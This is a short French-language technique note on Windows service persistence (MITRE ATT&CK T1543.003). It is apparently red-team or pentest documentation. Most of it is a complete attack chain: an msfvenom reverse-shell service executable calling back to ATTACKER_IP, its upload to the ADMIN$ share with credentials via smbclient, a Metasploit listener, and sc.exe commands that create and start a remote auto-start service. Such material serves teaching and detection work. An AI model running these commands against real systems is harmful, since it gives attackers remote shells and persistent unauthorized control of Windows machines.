mLes pirates peuvent créer ou modifier des services Windows pour exécuter de manière répétée des charges malveillantes dans le cadre de la persistance. Au démarrage de Windows, des programmes ou applications appelés services exécutent des fonctions système en arrière-plan. (Citation : TechNet Services) Les informations de configuration des services Windows, notamment le chemin d'accès aux fichiers exécutables ou aux programmes/commandes de récupération, sont stockées dans le Registre Windows.

#### Example 
Creation d'un shell inverse

```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

Nous avons télécharger notre charge utile sur le partage ADMIN$

```bash
smbclient -c 'put myservice.exe' -U $name$ -W $domaine '//$partage$/admin$/' $password$
```

Une fois notre exécutable téléchargé, nous allons configurer un écouteur sur la machine de l'attaquant pour recevoir le reverse shell de `msfconsole`:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $IP$; set LPORT 4444;exploit"
```

Et enfin, procédez à la création d'un nouveau service à distance en utilisant sc, en l'associant à notre binaire téléchargé

```PowerShell
C:\> sc.exe \\DossierPartage create service-3249 binPath= "%windir%\myservice.exe" start= auto 
C:\> sc.exe \\DossierPartage start service-3249
```

https://attack.mitre.org/techniques/T1543/003/
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md?plain=1